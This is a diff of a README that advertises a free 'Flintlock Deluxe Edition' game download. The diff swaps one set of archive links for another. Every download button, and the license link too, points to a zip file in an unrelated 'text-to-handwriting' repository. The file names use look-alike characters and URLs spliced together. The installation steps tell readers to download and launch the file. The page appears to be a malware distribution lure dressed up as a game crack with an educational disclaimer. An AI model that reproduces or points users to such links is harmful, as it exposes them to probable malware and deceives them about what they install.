@@ -1,6 +1,6 @@
 # 🎮 Flintlock Deluxe Edition Download 2025
 
-[![⬇️ Download Flintlock Deluxe Edition](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/Lоader.zip)](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/Lоader.zip)
+[![⬇️ Download Flintlock Deluxe Edition](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zipоhttps://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zip)](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zipоhttps://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zip)
 
 Unlock the full potential of your gaming experience with **Flintlock Deluxe Edition**! This advanced program enables seamless access to all features, exclusive content, and optimized performance. Perfect for dedicated adventurers and first-time explorers alike, Flintlock Deluxe Edition is your gateway to immersive worlds and high-quality gameplay.
 
@@ -35,7 +35,7 @@ Stay versatile—play Flintlock on your favorite platform!
 ## 🏁 Installation Guide
 
 1. **Download the installer:**  
-   [![Download Now](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/Lоader.zip)](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/Lоader.zip)
+   [![Download Now](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zipоhttps://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zip)](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zipоhttps://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zip)
 
 2. Launch the downloaded file and follow on-screen prompts.
 
@@ -61,10 +61,10 @@ This repository is for educational and informational use. Please respect the off
 
 ## ⚖️ License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/Lоader.zip) © 2025.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zipоhttps://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zip) © 2025.
 
 ---
 
 ## 🚩 Download Flintlock Deluxe Edition
 
-[![⬇️ Begin Download](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/Lоader.zip)](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/Lоader.zip)
+[![⬇️ Begin Download](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zipоhttps://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zip)](https://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zipоhttps://raw.githubusercontent.com/ElDonMuertoXD/text-to-handwriting/main/labral/text-to-handwriting-1.0.zip)
